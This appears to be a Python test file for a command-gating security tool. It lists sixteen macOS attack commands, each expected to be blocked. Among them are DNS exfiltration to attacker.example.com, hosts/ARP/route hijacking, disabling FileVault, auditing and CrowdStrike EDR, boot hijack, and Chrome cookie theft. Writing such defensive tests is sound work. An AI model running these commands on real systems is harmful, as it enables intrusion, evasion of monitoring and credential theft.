"""Root-demo ATTACKS — Tier 3 realistic attacker surface.

Network-layer attacker toolkit (DNS exfil, /etc/hosts + networksetup DNS
hijack, ARP spoof, default-route hijack, hostname takeover, NTP off),
plus MDM profile install / wipe, FileVault disable variant, bless boot
hijack, audit subsystem disable, EDR launchd unload, malicious installer
pkg, Safari extension enable, Chrome cookie theft.  These round out the
MITRE-for-macOS coverage beyond the spec's Act 5/6 corpus.

CATEGORY = "attacks" — fixtures live in ``intents/attacks/``; this file
just narrows the intent-number subset the runner exercises.

Prerequisites + verdict semantics: see ``root_test_runner.py``.

Usage::

  python demo/tests/root_demo/test_attacks_realistic.py
  python demo/tests/root_demo/test_attacks_realistic.py 85 92 97
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from typing import Any, Dict

from root_test_runner import RootIntentSuite


CATEGORY = "attacks"
SUITE_TITLE = "IntentFrame ROOT-DEMO ATTACKS — realistic attacker surface"

INTENTS: Dict[int, Dict[str, Any]] = {
    85: {
        "name": "DNS exfil via dig",
        "action": "RUN_COMMAND",
        "target": "dig $(whoami).attacker.example.com",
        "expected_decision": "BLOCK",
    },
    86: {
        "name": "DNS hijack via /etc/hosts",
        "action": "RUN_COMMAND",
        "target": "echo '1.2.3.4 github.com' >> /etc/hosts",
        "expected_decision": "BLOCK",
    },
    87: {
        "name": "Network DNS mutation via networksetup",
        "action": "RUN_COMMAND",
        "target": "networksetup -setdnsservers Wi-Fi 1.2.3.4",
        "expected_decision": "BLOCK",
    },
    88: {
        "name": "ARP spoof of gateway",
        "action": "RUN_COMMAND",
        "target": "arp -s 192.168.1.1 de:ad:be:ef:00:01",
        "expected_decision": "BLOCK",
    },
    89: {
        "name": "Default route hijack",
        "action": "RUN_COMMAND",
        "target": "route add default 10.66.66.1",
        "expected_decision": "BLOCK",
    },
    90: {
        "name": "Hostname takeover via scutil",
        "action": "RUN_COMMAND",
        "target": "scutil --set HostName attacker-controlled.local",
        "expected_decision": "BLOCK",
    },
    91: {
        "name": "Disable network time sync",
        "action": "RUN_COMMAND",
        "target": "systemsetup -setusingnetworktime off",
        "expected_decision": "BLOCK",
    },
    92: {
        "name": "Install MDM configuration profile",
        "action": "RUN_COMMAND",
        "target": "profiles install -path /tmp/evil.mobileconfig",
        "expected_decision": "BLOCK",
    },
    93: {
        "name": "Remove all MDM profiles",
        "action": "RUN_COMMAND",
        "target": "profiles remove -all",
        "expected_decision": "BLOCK",
    },
    94: {
        "name": "Disable FileVault for user",
        "action": "RUN_COMMAND",
        "target": "fdesetup disable -user operator",
        "expected_decision": "BLOCK",
    },
    95: {
        "name": "Boot hijack via bless",
        "action": "RUN_COMMAND",
        "target": "bless --mount / --folder /tmp/evil --setBoot",
        "expected_decision": "BLOCK",
    },
    96: {
        "name": "Disable audit subsystem",
        "action": "RUN_COMMAND",
        "target": "audit -t",
        "expected_decision": "BLOCK",
    },
    97: {
        "name": "Unload EDR launchd job",
        "action": "RUN_COMMAND",
        "target": "launchctl unload /Library/LaunchDaemons/com.crowdstrike.falcond.plist",
        "expected_decision": "BLOCK",
    },
    98: {
        "name": "Install malicious pkg via installer",
        "action": "RUN_COMMAND",
        "target": "installer -pkg /tmp/evil.pkg -target /",
        "expected_decision": "BLOCK",
    },
    99: {
        "name": "Enable Safari extensions via defaults",
        "action": "RUN_COMMAND",
        "target": "defaults write com.apple.Safari ExtensionsEnabled -bool true",
        "expected_decision": "BLOCK",
    },
    100: {
        "name": "Copy Chrome cookies",
        "action": "RUN_COMMAND",
        "target": "cp ~/Library/Application\\ Support/Google/Chrome/Default/Cookies /tmp/stolen",
        "expected_decision": "BLOCK",
    },
}


if __name__ == "__main__":
    RootIntentSuite(CATEGORY, INTENTS, SUITE_TITLE).main()
